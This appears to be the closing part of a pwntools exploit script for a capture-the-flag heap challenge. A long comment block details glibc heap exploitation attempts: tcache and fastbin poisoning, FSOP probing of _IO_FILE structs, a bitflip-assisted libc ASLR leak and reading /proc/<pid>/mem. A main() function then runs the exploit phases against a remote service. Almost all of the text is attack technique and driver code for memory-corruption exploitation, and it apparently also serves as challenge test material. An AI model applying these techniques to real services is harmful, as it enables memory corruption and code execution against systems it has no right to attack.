#             above -- they just don't produce a 3rd *virgin* slot, since
#             virginity specifically requires zero prior `post()` calls ever).
#           - A fastbin-struct-walk to check whether any of target/decoy's
#             own stray tcache-overflow residents could be directly
#             re-targeted instead of building a fresh "C"/"Y" pair (to avoid
#             needing the TC/B sub-construction's 2 indices at all): the
#             struct offsets for `main_arena.fastbinsY` were independently
#             confirmed via `gdb -batch -ex 'ptype struct malloc_state'`
#             against this exact libc.so.6 (which ships with full
#             `debug_info`), and stray residents were confirmed to exist
#             (tcache class saturates at count=7 after MINT=9 cycles,
#             spilling the remaining 2 into fastbin) -- but their own
#             in-chunk content was found to be the UN-overwritten leftover
#             `M`-fill bytes from minting, not a freshly safe-link-encoded
#             pointer, meaning they were never actually re-inserted through
#             a clean `_int_free()` safe-link encoding pass the way assumed;
#             not fully root-caused this pass, abandoned in favour of (A.3)'s
#             precise accounting once the exact 1-short number was in hand.
#           - `__libc_realloc(stale_nonnull_ptr, n)` was double-checked via
#             the SAME disassembly: there is no path from a non-NULL
#             `oldmem` into `__libc_malloc`'s tcache fast path, confirmed
#             structurally (the `test rbx,rbx; je <tail-call>` is the ONLY
#             branch into it), closing off any "disguise a tainted index as
#             virgin" idea definitively.
#
#   (B) FSOP / `_IO_FILE` -- explored via a DIFFERENT angle than guessing a
#       classic `_IO_str_jumps` fake-vtable chain: since phases 5-7's
#       fastbin-poison machinery (tainted indices only, NO virgin index
#       needed) was already PROVEN to work end-to-end whenever the
#       destination's `target-8` bytes already look like a plausible
#       fastbin chunksize, this pass wrote a script that read the ENTIRE
#       live, runtime content of libc's writable memory (via `/proc/<pid>/mem`,
#       correctly including the small *unnamed* anonymous mapping
#       immediately following libc's named rw segment in `/proc/<pid>/maps`
#       -- this is libc's own BSS overflow page, easily missed since it has
#       no `/path/to/libc.so.6` label; it was initially missed, producing a
#       false "no candidates" result, then found and fixed) and scanned
#       every 8-byte-aligned qword for one that, after masking the low 3
#       flag bits, equals a valid fastbin chunksize (0x20..0x90). Exactly
#       one clean, deterministic (non-coincidental, same every run) hit was
#       found: `global_max_fast` itself (libc+0x1f6000) holds the value
#       `0x80` (its own well-known default) -- i.e. `target = &global_max_fast + 8`
#       passes fastbin_index validation for free, no luck needed, 100% of
#       runs. The following 0x78-byte reachable window (`&global_max_fast+8`
#       through `+0x7f`) was then fully dumped and cross-referenced against
#       every OBJECT/FUNC symbol in libc.so.6's own symbol table (which is
#       NOT stripped) for anything actionable: it contains only
#       `__always_fail_morecore` (a legacy, effectively-dead 1-byte flag),
#       `mallwatch` (a debug-only watchpoint variable, never read by default
#       malloc paths), and otherwise-unnamed `.bss` padding -- no function
#       pointer, no GOT-like entry, nothing `_IO_FILE`-related. `mp_`
#       (malloc_par) and `narenas`'s own neighbourhoods were ALSO scanned the
#       same way (their own fields y always-known values like
#       `mp_.tcache_max_bytes=0x408` were checked too) with the same
#       outcome: valid-looking anchors exist, but none sit within one
#       primitive's reach of anything exploitable. `_IO_2_1_stdout_`,
#       `_IO_2_1_stdin_`, and `_IO_2_1_stderr_`'s own complete, live 0xe0-byte
#       structs (post-initialization, i.e. AFTER the challenge's own menu
#       I/O has already run at least once, so real buffer pointers are
#       populated, not static zeroes) were read in full and checked byte-by-
#       byte for a self-contained "offset-8 looks like a valid size"
#       coincidence landing on their own vtable slot (`+0xd8`): none of their
#       internal fields validate (`+0x70`'s value is `0x1`/`0x2` -- a file
#       descriptor number, not a size -- and every other field is either a
#       real pointer, `0`, or `-1`). FSOP via this specific angle is
#       therefore NOT reachable with the EXISTING fastbin-poison primitive
#       as-is; it would need its OWN, separately-constructed TC/B pair
#       positioned to reach `_IO_2_1_stdout_+0xd8` directly (the classic
#       heap-adjacent-corruption flavour of FSOP), which this pass did not
#       attempt (the heap and libc's BSS are different, non-adjacent
#       mappings -- the existing OOB-write primitive is heap-relative only
#       and cannot reach libc's .bss at all, so this avenue is a dead end
#       for THIS specific primitive, independent of the index-budget issue).
#
#   (C) A THIRD angle, not in the original brief but discovered and tried
#       this pass: the `bitflip()` menu option (flips the LSB of one
#       attacker-chosen byte, exactly once per connection, confirmed via
#       direct disassembly of `bitflip()` in the `todo` binary) can
#       trivially fix phase 3/4's original "unsorted-bin sentinel has a
#       coincidentally-zero low byte" problem DIRECTLY, with NO decoy chunk
#       and NO bin-sort probe needed at all: flipping the LSB of the forged
#       chunk's own `fd` field (which is deterministically `0x00` for this
#       exact libc/offset, independent of ASLR) turns it into `0x01`,
#       letting `read_my_note()`'s `"%.*s"` print continue past that byte
#       into the genuinely ASLR'd remaining bytes; XOR the first printed
#       byte back and the SAME libc_base pops out. This was verified live,
#       repeatedly, matching the real libc_base every time, using only 6
#       indices total (bootstrap + target's 5 -- no decoy, no probe!),
#       which would have left 4 whole virgin indices for phase (A) above --
#       more than enough. **However**: this leaves the forged chunk
#       resident, corrupted, and STILL in the unsorted bin (never sorted
#       into a largebin the way the decoy-based approach moves it to safety)
#       -- and `_int_malloc`'s unsorted-bin dequeue code validates BOTH
#       `victim->fd->bk == victim` AND `victim->bk->fd == victim` on ANY
#       later unlink of it (confirmed via disassembly: two back-to-back
#       `cmp`/`jne` pairs both branching to the same "malloc(): unsorted
#       double linked list corrupted" `malloc_printerr` call, at
#       libc+0x9a410), and this is NOT limited to a fresh allocation that
#       falls through all the way to the unsorted-bin scan: it ALSO fires
#       when an unrelated, already-tainted index's `post()` call tries to
#       GROW and happens to forward-consolidate into the corrupted chunk as
#       its physical neighbour (confirmed live: reusing target's own
#       mint-driver index immediately aborts the same way, because that
#       index's position is -- by forge_chunk()'s own construction --
#       directly adjacent to the forged chunk). Pre-seeding every
#       subsequently-needed size class from an ALREADY-populated
#       fastbin/tcache resident (so later allocations are satisfied by the
#       instant exact-match fast path, never reaching the corrupted-bin
#       code at all) was tried and DOES avoid the crash for a single fresh
#       TC/B build -- but the resulting "virgin" safe-link read is then
#       contaminated by whatever stray residents were already chained in
#       that class (their own content was found to be un-encoded leftover
#       fill bytes rather than a clean safe-link pointer, not yet root-
#       caused), and a subsequent, seemingly-unrelated reuse of a mint-driver
#       index for draining those residents ALSO crashed via the same
#       forward-consolidation path. This is a genuinely promising
#       index-budget-free alternative to the whole decoy apparatus, but it
#       trades a clean, fully-understood problem (A.3's precise "need one
#       more virgin index") for a less-understood one (exactly which future
#       operations are safe to perform near the now-permanently-poisoned
#       forged chunk) -- NOT resolved this pass.
#
# Summary: Approach A (tcache) is now PROVEN CORRECT as a mechanism (real,
# disassembly-verified, live-reproduced arbitrary-address retrieval with NO
# destination-byte dependency) and the remaining gap is exactly one virgin
# `TodoNote` index, out of a hard ceiling of 10, given the proven-reliable
# libc leak's own 9-index cost. Approach B (FSOP via the existing fastbin
# primitive) hit a dead end specific to THIS primitive's limited heap-local
# reach. The bitflip-based decoy elimination (C) is a real, verified-partial
# breakthrough that removes the index-budget problem entirely but introduces
# a different, not-yet-fully-characterized hazard. None of these are wired
# into `main()`; `challenge.yaml`'s `test:` section remains intentionally
# unwired. Flag NOT recovered this pass.
# =============================================================================


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")  # drain the startup banner + first menu prompt
    t = Todo(io)

    phase0_confirm_aliasing(t)
    heap_chunk_addr = phase1_heap_leak(t)
    phase2_overflow_write_and_minting(t)
    io.close()

    # Phase 3 needs all 10 todo indices, so it runs on its own fresh
    # connection rather than fighting phases 0-2 for index budget.
    phase3_forge_unsorted_bin_chunk_standalone()

    # Phase 4 (this pass's breakthrough): retry a few times, since any
    # individual byte of the leaked pointer independently has a small
    # chance of itself being 0x00 (truncating that one read short) --
    # unrelated to the sentinel-alignment bug phase 4 actually fixes.
    libc_base = None
    for attempt in range(5):
        libc_base = phase4_reliable_libc_leak_standalone()
        if libc_base:
            break

    if libc_base:
        log.success(
            "BREAKTHROUGH this pass: a genuine, reliable libc base leak "
            "(%#x) via a deliberately-placed smaller 'decoy' forged chunk "
            "that intercepts glibc's bin-scan ahead of the real target -- "
            "this is exactly the technique phase 3's final comment "
            "described as attempted-but-not-stabilized, now working. This "
            "fully defeats libc ASLR with NO dependency on the one "
            "coincidentally-unlucky byte that blocked the unsorted-bin "
            "approach.",
            libc_base,
        )
    log.failure(
        "Summary: all of phases 0-4's primitives are reproduced and "
        "confirmed exactly as before (UAF aliasing, heap leak, OOB write, "
        "heap minting, forging a chunk into real unsorted/large bins, and "
        "a reliable decoy-protected libc base leak via phase 4 + "
        "drain_probe_debris()). THIS PASS (phase 7, see its full comment "
        "block above) used live gdb tracing (custom auto-continuing "
        "breakpoints on _int_malloc/_int_free/_int_realloc/malloc_printerr, "
        "decoding fastbinsY by hand) to root-cause and FIX four real bugs: "
        "(1) the actual 'stray resident' cause -- forge_chunk()'s idx_a/"
        "idx_b pair sits beside its own still-intact largebin chunk, so a "
        "naive small-class flush through it silently forward-consolidates "
        "with that neighbour instead of touching the intended fastbin "
        "(fixed with one throwaway regrow first); (2) reusing one index "
        "for both 'pop P out' and 'pop P again after corrupting it' "
        "corrupts P's own header while it is still the live fastbin head "
        "(fixed by reusing the OTHER already-orphaned scratch index "
        "instead); (3) reusing an index whose own shrink byproduct lands "
        "back in the poisoned class recontaminates it (fixed by choosing "
        "a reuse index whose byproduct class is fixed and harmless); (4) "
        "phase5_tcache_poison_write()'s forged_fd was off by exactly "
        "0x10 (chunk2mem()'s offset), now corrected directly in that "
        "function. With all four applied and verified, the full chain "
        "runs with NO abort and the popped pointer EXACTLY matches the "
        "intended target -- CONFIRMED, but only when the target address's "
        "own '-8' bytes already hold a plausible size for the class. The "
        "one remaining, now precisely understood blocker (point 5 of the "
        "phase 7 writeup): realloc()'s grow path can only retrieve via "
        "_int_malloc's FASTBIN path, which unconditionally validates "
        "fastbin_index(chunksize(victim)) against whatever real bytes "
        "already sit at the destination -- for a genuinely arbitrary "
        "target (e.g. a stack address via environ) those bytes essentially "
        "never coincidentally pass, aborting with 'malloc(): memory "
        "corruption (fast)' before the pointer is ever handed back. Flag "
        "NOT recovered; challenge.yaml's test: section is intentionally "
        "left unwired.",
        hex(libc_base) if libc_base else "N/A (all retries came back short)",
    )
    sys.exit(1)



if __name__ == "__main__":
    main()
